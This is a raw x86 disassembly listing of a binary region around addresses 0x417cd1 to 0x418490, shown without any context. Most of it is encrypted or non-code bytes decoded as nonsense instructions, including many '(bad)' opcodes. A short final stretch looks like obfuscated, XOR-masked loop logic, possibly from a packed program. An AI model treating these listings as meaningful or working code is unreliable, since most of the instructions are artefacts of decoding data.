  417cd1:	xor    ah,BYTE PTR [esi]
  417cd3:	loop   0x417d28
  417cd5:	cdq    
  417cd6:	add    dl,BYTE PTR [edi+0x3bdc021b]
  417cdc:	retf   
  417cdd:	ja     0x417d41
  417cdf:	push   ebx
  417ce0:	mov    al,0xd1
  417ce2:	mov    edx,0xcb675fd6
  417ce7:	or     eax,0xab55882e
  417cec:	dec    esp
  417ced:	cmp    BYTE PTR [ecx+esi*8],cl
  417cf0:	push   es
  417cf1:	add    bh,BYTE PTR [edi]
  417cf3:	mov    ebx,0xaf5ab9b8
  417cf8:	jbe    0x417d61
  417cfa:	icebp  
  417cfb:	mov    bl,0x7e
  417cfd:	(bad)  
  417cfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cff:	rcr    BYTE PTR [ecx],cl
  417d01:	jns    0x417d4b
  417d03:	jo     0x417d47
  417d05:	mov    ch,0x28
  417d07:	dec    edx
  417d08:	rcr    DWORD PTR [esi+0x6],0xe0
  417d0c:	sbb    al,0x2a
  417d0e:	mov    ebp,0x57488ef9
  417d13:	aam    0x6f
  417d15:	jno    0x417d95
  417d17:	mov    dh,0x8d
  417d19:	dec    edx
  417d1a:	sbb    ebp,ecx
  417d1c:	add    esi,eax
  417d1e:	jecxz  0x417cc6
  417d20:	cli    
  417d21:	lock push edx
  417d23:	mov    BYTE PTR [ebx],bh
  417d25:	mov    dh,0x1e
  417d27:	and    DWORD PTR [edi],0x56
  417d2a:	add    ch,BYTE PTR [ebx-0x7385ea5f]
  417d30:	fcomip st,st(0)
  417d32:	dec    ebx
  417d33:	ja     0x417d66
  417d35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d36:	test   eax,0xf26ac3bb
  417d3b:	lods   al,BYTE PTR ds:[esi]
  417d3c:	inc    esi
  417d3d:	(bad)  
  417d3e:	or     edi,DWORD PTR [ebx-0x60]
  417d41:	adc    esi,DWORD PTR [ecx+0x76e9c41b]
  417d47:	push   0x43
  417d49:	fcomp  DWORD PTR [edx-0x26]
  417d4c:	push   ebx
  417d4d:	pop    ecx
  417d4e:	mov    dl,0xb9
  417d50:	dec    esi
  417d51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d52:	dec    ebp
  417d53:	mov    ebx,0xae47e88b
  417d58:	jecxz  0x417d71
  417d5a:	test   BYTE PTR [ecx+0x27f86b61],dh
  417d60:	cld    
  417d61:	fist   DWORD PTR [ebp+0x39adc027]
  417d67:	and    eax,0x54936d84
  417d6c:	fisubr DWORD PTR [eax-0x2d3a5662]
  417d72:	sbb    BYTE PTR [esi-0x12],ch
  417d75:	jg     0x417d63
  417d77:	sbb    DWORD PTR [eax],eax
  417d79:	pop    ss
  417d7a:	add    ch,BYTE PTR [ebp+0x67]
  417d7d:	loop   0x417d1a
  417d7f:	pop    ecx
  417d80:	sbb    bl,BYTE PTR [esi+0x7b]
  417d83:	fwait
  417d84:	mov    ah,cl
  417d86:	xchg   edi,eax
  417d87:	cmc    
  417d88:	xor    al,0xb9
  417d8a:	rol    BYTE PTR ds:0x27348fd6,0xaa
  417d91:	inc    eax
  417d92:	fwait
  417d93:	pop    ds
  417d94:	cmp    edi,ecx
  417d96:	push   0x32a57f84
  417d9b:	mov    edx,0x63f376e5
  417da0:	jg     0x417d2a
  417da2:	mov    eax,ds:0x2fc62fdc
  417da7:	pop    edi
  417da8:	mov    dh,0xbe
  417daa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417dab:	(bad)  
  417dac:	out    dx,al
  417dad:	imul   ebp,DWORD PTR [ebp+0x49ed7dfc],0x191d1508
  417db7:	xor    eax,0xd7cb3454
  417dbc:	pop    ebx
  417dbd:	cmp    edx,DWORD PTR [esi+edi*1-0x5c]
  417dc1:	add    eax,0x629b2957
  417dc6:	adc    eax,0x4fcd360a
  417dcb:	imul   esi,DWORD PTR [edx],0xffffffad
  417dce:	addr16 jbe 0x417e03
  417dd1:	ja     0x417d98
  417dd3:	mov    dl,0x67
  417dd5:	leave  
  417dd6:	pop    ebx
  417dd7:	outs   dx,BYTE PTR ds:[esi]
  417dd8:	je     0x417e2b
  417dda:	mov    edx,0xc331c89b
  417ddf:	aaa    
  417de0:	mov    eax,ds:0x73af6e0e
  417de5:	outs   dx,BYTE PTR ds:[esi]
  417de6:	mov    ebp,esi
  417de8:	push   ecx
  417de9:	push   es
  417dea:	ficomp DWORD PTR [edi-0x7]
  417ded:	jb     0x417e6a
  417def:	mov    bl,0x90
  417df1:	mov    al,ds:0x41c708c2
  417df6:	scas   eax,DWORD PTR es:[edi]
  417df7:	add    al,0x11
  417df9:	hlt    
  417dfa:	xor    ebp,eax
  417dfc:	jnp    0x417db8
  417dfe:	inc    ebp
  417dff:	dec    edx
  417e00:	daa    
  417e01:	pusha  
  417e02:	xchg   ebx,eax
  417e03:	sbb    DWORD PTR [edi+0x7d],eax
  417e06:	jg     0x417e41
  417e08:	xchg   esp,eax
  417e09:	mov    eax,ds:0xaad5d874
  417e0e:	test   DWORD PTR [ebp+0x3e8b0bba],esi
  417e14:	gs pusha 
  417e16:	or     ebp,DWORD PTR [eax+0x4b]
  417e19:	repnz pusha 
  417e1b:	mov    dl,0xe6
  417e1d:	and    eax,0xa5524418
  417e22:	add    DWORD PTR [edx+0x6d],edx
  417e25:	mov    esi,0xb11fec23
  417e2a:	mov    WORD PTR [edi],?
  417e2c:	(bad)  
  417e2d:	jg     0x417e85
  417e2f:	and    al,0xc0
  417e31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e32:	rol    BYTE PTR [esp+edi*8+0x24ce1342],1
  417e39:	mov    ch,0xc8
  417e3b:	pop    ss
  417e3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e3d:	sub    ebp,ebp
  417e3f:	cmp    dl,BYTE PTR [edi-0x60]
  417e42:	mov    BYTE PTR [esi+0x62],dh
  417e45:	and    BYTE PTR [ebx+ebp*8-0x19764924],dl
  417e4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e4d:	ss aad 0x75
  417e50:	test   al,0xb7
  417e52:	inc    esp
  417e53:	ror    DWORD PTR [edx],0x30
  417e56:	test   BYTE PTR [ebx-0x17099524],al
  417e5c:	jmp    0x4d29940
  417e61:	and    al,0x70
  417e63:	(bad)  
  417e64:	xor    al,0xf4
  417e66:	adc    ebx,ebp
  417e68:	cmp    ah,dl
  417e6a:	xor    BYTE PTR [esp+edi*2+0x18],cl
  417e6e:	ins    BYTE PTR es:[edi],dx
  417e6f:	pop    es
  417e70:	jge    0x417ebe
  417e72:	sbb    BYTE PTR [ebp+0x29cc8136],dl
  417e78:	ret    
  417e79:	push   esi
  417e7a:	dec    ebx
  417e7b:	add    ah,ch
  417e7d:	adc    BYTE PTR [ebx+0x621e0dd3],dl
  417e83:	outs   dx,DWORD PTR ds:[esi]
  417e84:	push   ds
  417e85:	rcr    BYTE PTR [ecx+0x7e98817d],cl
  417e8b:	jnp    0x417eda
  417e8d:	fbld   TBYTE PTR [ebx-0x59]
  417e90:	clc    
  417e91:	hlt    
  417e92:	loopne 0x417ecb
  417e94:	jg     0x417ebf
  417e96:	mov    eax,ss
  417e98:	(bad)  
  417e99:	mov    esp,0xdafac54f
  417e9e:	gs mov edi,0x342fd33c
  417ea4:	je     0x417e2a
  417ea6:	ja     0x417e88
  417ea8:	aam    0x3c
  417eaa:	cdq    
  417eab:	addr16 or ch,al
  417eae:	sbb    DWORD PTR [ebp-0x11c68b6d],ebx
  417eb4:	into   
  417eb5:	mov    ds:0xcc03933b,al
  417eba:	retf   
  417ebb:	daa    
  417ebc:	jbe    0x417e4e
  417ebe:	xchg   DWORD PTR [ebx-0x4],edx
  417ec1:	stc    
  417ec2:	daa    
  417ec3:	cdq    
  417ec4:	data16 mov fs,WORD PTR [esp+edx*4+0x5a]
  417ec9:	push   esp
  417eca:	xor    ebx,eax
  417ecc:	xchg   esi,eax
  417ecd:	mov    ds:0xfea073af,eax
  417ed2:	xchg   DWORD PTR [esi],esi
  417ed4:	das    
  417ed5:	aaa    
  417ed6:	mov    ebp,0x98edb0c5
  417edb:	sahf   
  417edc:	sub    edx,eax
  417ede:	dec    ebx
  417edf:	cmp    al,0x77
  417ee1:	fcomp  DWORD PTR [eax+0x1f]
  417ee4:	mov    al,0x7b
  417ee6:	sbb    al,cl
  417ee8:	jne    0x417e9d
  417eea:	or     dl,BYTE PTR [esi-0xc]
  417eed:	div    BYTE PTR [edx+0x1f]
  417ef0:	leave  
  417ef1:	cmc    
  417ef2:	mov    dh,0x9d
  417ef4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ef5:	sbb    DWORD PTR [eax-0x17],ebp
  417ef8:	mov    dl,0xe6
  417efa:	adc    ebx,DWORD PTR [eax-0x53]
  417efd:	add    ebp,edi
  417eff:	inc    ebx
  417f01:	int    0xa8
  417f03:	(bad)  [edx]
  417f05:	(bad)  
  417f06:	adc    cl,dh
  417f08:	pop    edx
  417f09:	shl    DWORD PTR [ebp-0x3ab48958],cl
  417f0f:	js     0x417ed2
  417f11:	mov    ds:0x8de923c4,eax
  417f16:	mov    edi,0xac9b6775
  417f1b:	int    0x96
  417f1d:	in     eax,dx
  417f1e:	cdq    
  417f1f:	cmp    bh,BYTE PTR [edx+0x57]
  417f22:	in     eax,dx
  417f23:	xchg   DWORD PTR [ecx],edx
  417f25:	inc    edx
  417f26:	loopne 0x417f52
  417f28:	sbb    cl,BYTE PTR [ebx+esi*2+0x60d1f593]
  417f2f:	add    bh,bh
  417f31:	data16 add ah,0xed
  417f35:	sbb    ch,BYTE PTR [edx]
  417f37:	jge    0x417f99
  417f39:	lea    esi,ds:0x929ec692
  417f3f:	mov    ah,0xa6
  417f41:	addr16 ss jg 0x417f6d
  417f45:	sbb    al,0x52
  417f47:	lock xchg ecx,eax
  417f49:	div    DWORD PTR [eax+0x7d7467f6]
  417f4f:	gs cli 
  417f51:	(bad)  
  417f52:	push   ecx
  417f53:	adc    al,0x8f
  417f55:	fistp  DWORD PTR [eax+0x6695a75]
  417f5b:	aaa    
  417f5c:	xchg   edx,eax
  417f5d:	ds push eax
  417f5f:	ror    BYTE PTR [esi+0x678b2f01],1
  417f65:	add    DWORD PTR [ecx],0xffffffff
  417f68:	bound  ebp,QWORD PTR [ebp+esi*8+0x7a2cdb29]
  417f6f:	sub    BYTE PTR [edi],bh
  417f71:	dec    eax
  417f72:	mov    ecx,0x989f8aa8
  417f77:	cmp    dh,BYTE PTR [ebx+0x61]
  417f7a:	repnz imul edx,DWORD PTR [eax],0xffffffad
  417f7e:	or     ebp,edi
  417f80:	jo     0x417f80
  417f82:	test   eax,0xede30080
  417f87:	pushf  
  417f88:	jmp    0x417fd7
  417f8a:	fdivr  DWORD PTR ds:0xb04cbeb1
  417f90:	push   ebx
  417f91:	jmp    0x6121bd75
  417f96:	stos   DWORD PTR es:[edi],eax
  417f97:	xchg   ebp,eax
  417f98:	pop    ds
  417f99:	stos   BYTE PTR es:[edi],al
  417f9a:	push   0xffffff90
  417f9c:	dec    edi
  417f9d:	sub    BYTE PTR [edi+ebp*2],0x48
  417fa1:	fwait
  417fa2:	sub    DWORD PTR [edx-0x458d9290],edi
  417fa8:	aaa    
  417fa9:	cmp    esi,edi
  417fab:	mov    edi,0x605541c5
  417fb0:	fisttp WORD PTR [eax-0x6d8a939e]
  417fb6:	unpckhps xmm2,xmm7
  417fb9:	ds scas eax,DWORD PTR es:[edi]
  417fbb:	stos   BYTE PTR es:[edi],al
  417fbc:	lock ins DWORD PTR es:[edi],dx
  417fbe:	inc    ebp
  417fbf:	or     al,0xba
  417fc1:	xchg   edx,eax
  417fc2:	sub    DWORD PTR [esi],ebx
  417fc4:	fsubr  DWORD PTR [ecx]
  417fc6:	mov    bh,0x98
  417fc8:	sbb    edx,ecx
  417fca:	push   ss
  417fcb:	int    0x87
  417fcd:	in     al,0x1f
  417fcf:	iret   
  417fd0:	jns    0x418013
  417fd2:	repnz xchg edi,eax
  417fd4:	scas   eax,DWORD PTR es:[edi]
  417fd5:	pop    ebp
  417fd6:	jp     0x417fab
  417fd8:	jae    0x418031
  417fda:	mov    edx,0x75e88195
  417fdf:	xor    ah,BYTE PTR [edx+eiz*4+0x71]
  417fe3:	lahf   
  417fe4:	fs pop edx
  417fe6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fe7:	jbe    0x41804a
  417fe9:	push   eax
  417fea:	push   ds
  417feb:	lahf   
  417fec:	xchg   edi,eax
  417fed:	stos   BYTE PTR es:[edi],al
  417fee:	retf   0x647a
  417ff1:	sub    eax,0x55402198
  417ff6:	loop   0x418061
  417ff8:	into   
  417ff9:	adc    edi,DWORD PTR [eax-0x6c]
  417ffc:	push   0x5c
  417ffe:	cmp    BYTE PTR [edx],bl
  418000:	lea    esp,[ecx+0x1b]
  418003:	test   eax,0x6f6dda3b
  418008:	cmp    BYTE PTR [edi],ch
  41800a:	iret   
  41800b:	or     al,0x23
  41800d:	mov    bh,0xf7
  41800f:	rcl    BYTE PTR [esi-0x9],1
  418012:	fidivr DWORD PTR [esi-0x58]
  418015:	out    dx,eax
  418016:	adc    ah,BYTE PTR [edx]
  418018:	adc    al,ah
  41801a:	lea    ecx,[ecx-0x3d86f245]
  418020:	(bad)  
  418021:	int3   
  418022:	add    ah,BYTE PTR [ecx-0x13]
  418025:	adc    ecx,DWORD PTR [edi-0x35]
  418028:	cmp    ebx,DWORD PTR [edx+0x4115e32d]
  41802e:	in     al,0x83
  418030:	mov    al,ds:0xe1ea4bbc
  418035:	test   BYTE PTR [edi-0x766d620f],ah
  41803b:	(bad)  
  41803c:	in     al,dx
  41803d:	shl    BYTE PTR [ecx],0xcc
  418040:	mov    bh,0x1c
  418042:	pop    esp
  418043:	sub    DWORD PTR [ecx+0x7a619456],edi
  418049:	mov    eax,ds:0x3d23bafa
  41804e:	dec    ecx
  41804f:	adc    ah,cl
  418051:	icebp  
  418052:	mov    ebx,0xb31ca2b0
  418057:	je     0x41806c
  418059:	xor    DWORD PTR [ebx],esp
  41805b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41805c:	pop    es
  41805d:	and    BYTE PTR [ecx-0x61c27d61],al
  418063:	mov    al,ds:0xec70677
  418068:	sub    bh,BYTE PTR [ebp-0x27]
  41806b:	and    BYTE PTR [eax+0x56],ah
  41806e:	mov    dl,0x9f
  418070:	adc    al,0x75
  418072:	push   0xe545e2a0
  418077:	sub    eax,0x293c7971
  41807c:	adc    BYTE PTR [ecx-0x7d],0x8d
  418080:	rol    BYTE PTR [ecx-0x2cce6a40],1
  418086:	imul   esi,DWORD PTR [ebx],0xd1dc6310
  41808c:	cmp    eax,0x414a43dd
  418091:	jmp    0x3621:0x2d6733a9
  418098:	jbe    0x418097
  41809a:	into   
  41809b:	adc    DWORD PTR [ecx+0x47e82425],edx
  4180a1:	fnstenv [edx+0x4e091a3b]
  4180a7:	push   edx
  4180a8:	ins    BYTE PTR es:[edi],dx
  4180a9:	pop    edx
  4180aa:	mov    eax,ds:0xa8538e9e
  4180af:	sub    al,0xcb
  4180b1:	bound  ecx,QWORD PTR [esi+0x7]
  4180b4:	aam    0x51
  4180b6:	inc    esi
  4180b7:	inc    eax
  4180b8:	xchg   DWORD PTR ds:0x10ffe51c,esi
  4180be:	stc    
  4180bf:	inc    esi
  4180c0:	stos   BYTE PTR es:[edi],al
  4180c1:	sahf   
  4180c2:	and    eax,0xfddff63f
  4180c7:	in     al,dx
  4180c8:	(bad)  
  4180c9:	outs   dx,BYTE PTR ds:[esi]
  4180ca:	sbb    DWORD PTR [ebp+0x1dcbef8d],ebp
  4180d0:	fstp   st(1)
  4180d2:	ja     0x41807e
  4180d4:	enter  0x9da4,0x3f
  4180d8:	mov    ecx,ecx
  4180da:	fadd   st,st(2)
  4180dc:	adc    esi,DWORD PTR [ebp+0x6caf4c22]
  4180e2:	xchg   edx,eax
  4180e3:	icebp  
  4180e4:	stc    
  4180e5:	sar    BYTE PTR [edx+0x36],cl
  4180e8:	test   eax,0x8035c395
  4180ed:	rcr    BYTE PTR [eax+0x650822d6],1
  4180f3:	add    eax,edx
  4180f5:	push   ebp
  4180f6:	jno    0x4180dd
  4180f8:	xor    al,0x57
  4180fa:	je     0x4180bc
  4180fc:	repnz nop
  4180fe:	jge    0x418087
  418100:	jmp    0x8258b42f
  418105:	pusha  
  418106:	xchg   esp,eax
  418107:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418108:	jp     0x4180ca
  41810a:	jne    0x418167
  41810c:	(bad)  
  41810d:	fcmovu st,st(6)
  41810f:	xchg   ebx,eax
  418110:	push   edi
  418111:	mov    ah,0x18
  418113:	or     al,0x9d
  418115:	clc    
  418116:	aam    0x44
  418118:	add    eax,0x333ace77
  41811d:	inc    ebp
  41811e:	repnz inc esp
  418120:	mov    BYTE PTR [esi-0x4d0483e9],dl
  418126:	pop    ecx
  418127:	xchg   esp,eax
  418128:	loop   0x418106
  41812a:	iret   
  41812b:	ret    0x9747
  41812e:	lds    ebp,FWORD PTR [ebx]
  418130:	push   eax
  418131:	jb     0x418180
  418133:	push   eax
  418134:	dec    ebx
  418135:	js     0x4181a1
  418137:	inc    esi
  418138:	push   ss
  418139:	push   eax
  41813a:	aas    
  41813b:	sub    DWORD PTR [edx+eax*1-0x6b],edi
  41813f:	mov    ds:0xcedd784c,al
  418144:	loope  0x418176
  418146:	adc    DWORD PTR [eax+0x3],edx
  418149:	imul   esi,DWORD PTR [eiz*2+0x7d3f476],0x77
  418151:	and    al,0x8
  418153:	lds    ebx,FWORD PTR [edi]
  418155:	sbb    BYTE PTR [eax-0x4c00f67c],dh
  41815b:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41815d:	or     DWORD PTR [eax+eiz*2],eax
  418160:	into   
  418161:	jnp    0x41815f
  418163:	dec    ecx
  418164:	sub    DWORD PTR [ebx],ecx
  418166:	adc    BYTE PTR [eax-0x425ad844],bl
  41816c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41816d:	pop    ds
  41816e:	(bad)  
  41816f:	shl    DWORD PTR [ecx],1
  418171:	or     al,0xc4
  418173:	xchg   cl,bl
  418175:	mov    al,0xf0
  418177:	adc    BYTE PTR [edi+edi*2-0x47],0x8d
  41817c:	xchg   ecx,eax
  41817d:	(bad)  
  41817e:	bound  edx,QWORD PTR [edi-0x72c9d0d9]
  418184:	aam    0xc3
  418186:	lock sbb al,0x38
  418189:	(bad)  
  41818a:	repnz rcl DWORD PTR [edi-0xd58fba2],cl
  418191:	xchg   esi,eax
  418192:	shl    BYTE PTR ds:0x2453ca46,cl
  418198:	and    eax,0xf641fed4
  41819d:	xor    eax,DWORD PTR [ecx+0x3a02f754]
  4181a3:	pop    es
  4181a4:	stos   DWORD PTR es:[edi],eax
  4181a5:	mov    ecx,0xb1fae774
  4181aa:	fild   DWORD PTR [ebx+0x6d13c9e8]
  4181b0:	clc    
  4181b1:	xchg   edi,eax
  4181b2:	test   DWORD PTR [edi],edi
  4181b4:	jge    0x418234
  4181b6:	fiadd  DWORD PTR [ebx-0x49cbfd5a]
  4181bc:	iret   
  4181bd:	addr16 pop esp
  4181bf:	mov    esp,0x985a21ba
  4181c4:	jbe    0x41817a
  4181c6:	pop    ebx
  4181c7:	xchg   ebx,eax
  4181c8:	mov    dl,0x76
  4181ca:	pop    esi
  4181cb:	and    BYTE PTR [ebx+edi*8+0x12],cl
  4181cf:	aam    0x29
  4181d1:	mov    edi,0x47246108
  4181d6:	inc    edi
  4181d7:	sub    al,bl
  4181d9:	push   esp
  4181da:	sub    edi,esi
  4181dc:	xchg   esp,eax
  4181dd:	sub    eax,0x58bffa0f
  4181e2:	mov    dh,al
  4181e4:	shl    DWORD PTR [ebp+0x5d],0x27
  4181e8:	test   DWORD PTR [ecx],ebx
  4181ea:	dec    BYTE PTR [ebp+0x8]
  4181ed:	jo     0x41823a
  4181ef:	lea    esi,[eax-0x4fc76704]
  4181f5:	cmp    ebx,0x844f957d
  4181fb:	mov    ah,0xca
  4181fd:	xlat   BYTE PTR ds:[ebx]
  4181fe:	jmp    0x4181bb
  418200:	cmp    ebp,DWORD PTR [edx-0x5b]
  418203:	inc    ebp
  418204:	test   dl,ah
  418206:	loope  0x4181b3
  418208:	outs   dx,DWORD PTR ds:[esi]
  418209:	int3   
  41820a:	mov    esp,0xd4484878
  41820f:	mov    bh,0xfd
  418211:	(bad)  
  418212:	aam    0x93
  418214:	and    bl,BYTE PTR [eax]
  418216:	sub    BYTE PTR [edi-0x2b333c36],bl
  41821c:	adc    al,0x7a
  41821e:	and    dl,BYTE PTR [ebp+0x158de271]
  418224:	mov    BYTE PTR [ebx-0x1a],ah
  418227:	push   eax
  418228:	popf   
  418229:	out    0xe0,eax
  41822b:	pusha  
  41822c:	or     DWORD PTR [eax],esp
  41822e:	mov    esp,ecx
  418230:	pop    esp
  418231:	daa    
  418232:	cli    
  418233:	les    ebp,FWORD PTR [esi]
  418235:	loope  0x41828a
  418237:	fmul   DWORD PTR [ebx]
  418239:	stc    
  41823a:	adc    al,0x7e
  41823d:	xor    ebx,DWORD PTR [esi+0x26]
  418240:	cmp    eax,0x7967406b
  418245:	push   ds
  418246:	mov    cl,0x19
  418248:	mov    cx,0x1d21
  41824c:	adc    ecx,eax
  41824e:	cmc    
  41824f:	push   es
  418250:	xchg   dh,ah
  418252:	sub    dh,dl
  418254:	and    ebx,esp
  418256:	mov    BYTE PTR [edi],bh
  418258:	mov    cl,0xf
  41825a:	pop    eax
  41825b:	in     al,0x6a
  41825d:	push   esi
  41825e:	jbe    0x41824e
  418260:	mov    bh,0xe6
  418262:	test   ecx,esi
  418264:	sub    DWORD PTR [eax+0x6251ec5d],ecx
  41826a:	sub    ebx,DWORD PTR [eax]
  41826c:	and    DWORD PTR [ebx],eax
  41826e:	popa   
  41826f:	mov    ecx,0x218905aa
  418274:	fisubr WORD PTR [ebp+0x5583a1e]
  41827a:	test   WORD PTR [ebp-0x38],bp
  41827e:	jns    0x41829f
  418280:	push   es
  418281:	pop    esi
  418282:	sbb    BYTE PTR [esp+ebp*8],cl
  418285:	dec    edx
  418286:	inc    ecx
  418287:	int3   
  418288:	cmp    edi,DWORD PTR [eax+ecx*8+0x38]
  41828c:	pop    edi
  41828d:	pusha  
  41828e:	js     0x418294
  418290:	in     al,dx
  418291:	out    0xbf,eax
  418293:	fstp   DWORD PTR [ebx]
  418295:	xchg   ecx,eax
  418296:	inc    ebp
  418297:	mov    ch,0xc8
  418299:	pop    edi
  41829a:	adc    edx,esp
  41829c:	pop    ds
  41829d:	xor    eax,eax
  41829f:	cmc    
  4182a0:	shr    cl,0x7
  4182a3:	imul   esp,DWORD PTR [esi-0x299b3870],0x2c865524
  4182ad:	mov    eax,0xbad4eb3
  4182b2:	ror    BYTE PTR [ebx],cl
  4182b4:	ins    BYTE PTR es:[edi],dx
  4182b5:	in     eax,0x4b
  4182b7:	imul   DWORD PTR [edx+0x2c]
  4182ba:	les    ebx,FWORD PTR [bx]
  4182bd:	xchg   esi,eax
  4182be:	fstp   TBYTE PTR [eax]
  4182c0:	addr16 inc ebp
  4182c2:	out    dx,al
  4182c3:	std    
  4182c4:	inc    edx
  4182c5:	and    BYTE PTR [ecx+0x38802ca4],0xe5
  4182cc:	push   esi
  4182cd:	cmp    BYTE PTR [ecx-0x3564246a],dh
  4182d3:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182d5:	push   0x2f74799c
  4182da:	push   eax
  4182db:	repnz call 0xd628:0x9168920e
  4182e3:	sub    eax,0x61d2574b
  4182e8:	mov    dl,0xf7
  4182ea:	push   eax
  4182eb:	(bad)  
  4182ed:	mov    eax,0x11ef15c5
  4182f2:	jge    0x41835e
  4182f4:	sub    al,0xb8
  4182f6:	shl    DWORD PTR [eax+0x702176d],cl
  4182fc:	dec    edi
  4182fd:	jl     0x4182e7
  4182ff:	call   0x8a9d7049
  418304:	push   ebx
  418305:	das    
  418306:	mov    al,ds:0x16de70e5
  41830b:	push   edi
  41830c:	std    
  41830d:	not    BYTE PTR [eax-0x5e]
  418310:	aas    
  418311:	(bad)  
  418312:	retf   
  418313:	mov    BYTE PTR [eax-0x43],0xd
  418317:	and    BYTE PTR [ebp-0x76],cl
  41831a:	dec    edx
  41831b:	scas   al,BYTE PTR es:[edi]
  41831c:	adc    eax,0x26b653ed
  418321:	inc    esp
  418322:	xchg   al,dl
  418324:	popf   
  418325:	ret    0x8544
  418328:	or     DWORD PTR [eax+0x30f443ef],ebp
  41832e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41832f:	cmp    al,0x31
  418331:	dec    ebx
  418332:	jmp    edi
  418334:	fadd   st(0),st
  418336:	retf   
  418337:	inc    esp
  418338:	lods   al,BYTE PTR ds:[esi]
  418339:	cmp    eax,0xd305901d
  41833e:	test   DWORD PTR [ecx-0xf],eax
  418341:	pop    es
  418342:	and    eax,0xeab2a322
  418347:	jns    0x4182cf
  418349:	dec    ebx
  41834a:	pop    ds
  41834b:	scas   al,BYTE PTR es:[edi]
  41834c:	mov    bh,0x95
  41834e:	retf   
  41834f:	hlt    
  418350:	jmp    0x418334
  418352:	ret    0x16c5
  418355:	pop    edx
  418356:	and    eax,0x9460ce05
  41835b:	mov    cl,BYTE PTR [esi-0x5b]
  41835e:	ret    0x1b28
  418361:	(bad)
  418365:	(bad)  
  418366:	xchg   edx,eax
  418367:	outs   dx,DWORD PTR ds:[esi]
  418368:	ja     0x41839a
  41836a:	les    ebp,FWORD PTR [eax+0x70]
  41836d:	bound  ebp,QWORD PTR [eax+0x7c]
  418370:	jmp    0x418366
  418372:	mov    bl,0x6f
  418374:	mov    esi,0xe2747d48
  418379:	xor    esi,0xffffffd4
  41837c:	dec    edi
  41837d:	stos   DWORD PTR es:[edi],eax
  41837e:	mov    ebp,0xf1c6f03a
  418383:	dec    esi
  418384:	jo     0x41838a
  418386:	push   ebx
  418387:	jne    0x413c7e
  41838d:	mov    edx,DWORD PTR [ebp-0xc]
  418390:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  418397:	mov    bl,BYTE PTR [ebp-0x1]
  41839a:	cmp    dl,bl
  41839c:	je     0x41a7c3
  4183a2:	mov    ecx,DWORD PTR [ebp-0x5c]
  4183a5:	mov    edx,DWORD PTR [ebp-0xc]
  4183a8:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  4183af:	mov    ebx,DWORD PTR [ebp+0xc]
  4183b2:	xor    ecx,eax
  4183b4:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272e2]
  4183bb:	jne    0x41cc40
  4183c1:	mov    ecx,DWORD PTR [ebp-0x5c]
  4183c4:	mov    edx,DWORD PTR [ebp+0xc]
  4183c7:	xor    ecx,eax
  4183c9:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272e2]
  4183d1:	mov    edx,DWORD PTR [ebp-0x18]
  4183d4:	xor    edx,eax
  4183d6:	add    edx,esi
  4183d8:	cmp    ecx,edx
  4183da:	mov    ecx,DWORD PTR [ebp-0x14]
  4183dd:	mov    DWORD PTR [ebp+0x8],ecx
  4183e0:	mov    ecx,DWORD PTR [ebp+0x8]
  4183e3:	je     0x41cd48
  4183e9:	xor    ecx,eax
  4183eb:	add    ecx,esi
  4183ed:	mov    ecx,0x242ebe9
  4183f2:	je     0x41cb94
  4183f8:	mov    edx,DWORD PTR [ebp+0x8]
  4183fb:	mov    ebx,DWORD PTR [ebp-0x8]
  4183fe:	xor    edx,eax
  418400:	xor    ebx,eax
  418402:	sub    edx,ebx
  418404:	sub    edx,esi
  418406:	xor    edx,eax
  418408:	mov    DWORD PTR [ebp+0x8],edx
  41840b:	mov    edx,DWORD PTR [ebp+0x8]
  41840e:	mov    ebx,DWORD PTR [ebp-0x58]
  418411:	add    edx,0x5708c4
  418417:	imul   edx,ebx
  41841a:	mov    DWORD PTR [ebp-0x58],edx
  41841d:	mov    edx,DWORD PTR [ebp+0x8]
  418420:	mov    ebx,DWORD PTR [ebp-0x54]
  418423:	add    edx,0x64f8da
  418429:	or     edx,ebx
  41842b:	mov    DWORD PTR [ebp-0x54],edx
  41842e:	mov    edx,DWORD PTR [ebp+0x8]
  418431:	mov    ebx,DWORD PTR [ebp-0x50]
  418434:	add    edx,ecx
  418436:	xor    edx,ebx
  418438:	mov    DWORD PTR [ebp-0x50],edx
  41843b:	mov    edx,DWORD PTR [ebp+0x8]
  41843e:	mov    ebx,DWORD PTR [ebp-0x4c]
  418441:	add    edx,edi
  418443:	and    edx,ebx
  418445:	mov    DWORD PTR [ebp-0x4c],edx
  418448:	mov    edx,DWORD PTR [ebp+0x8]
  41844b:	mov    ebx,DWORD PTR [ebp-0x48]
  41844e:	lea    edx,[ebx+edx*1+0x241fc1f]
  418455:	mov    DWORD PTR [ebp-0x48],edx
  418458:	mov    edx,DWORD PTR [ebp+0x8]
  41845b:	mov    ebx,0xfa5e15e2
  418460:	sub    ebx,edx
  418462:	add    ebx,DWORD PTR [ebp-0x44]
  418465:	mov    DWORD PTR [ebp-0x44],ebx
  418468:	mov    edx,DWORD PTR [ebp+0x8]
  41846b:	xor    edx,eax
  41846d:	add    edx,esi
  41846f:	jne    0x4183f8
  418475:	jmp    0x41cb94
  41847a:	jmp    0x41a7c3
  41847f:	adc    BYTE PTR [edi],cl
  418481:	lods   eax,DWORD PTR ds:[esi]
  418482:	fnsave [ebx-0x21]
  418485:	lock jae 0x41841c
  418488:	sbb    DWORD PTR [edx-0x4],ebx
  41848b:	jnp    0x418499
  41848d:	je     0x4184d2
  41848f:	int3   
  418490:	xor    BYTE PTR [ebp+0x7c],bh
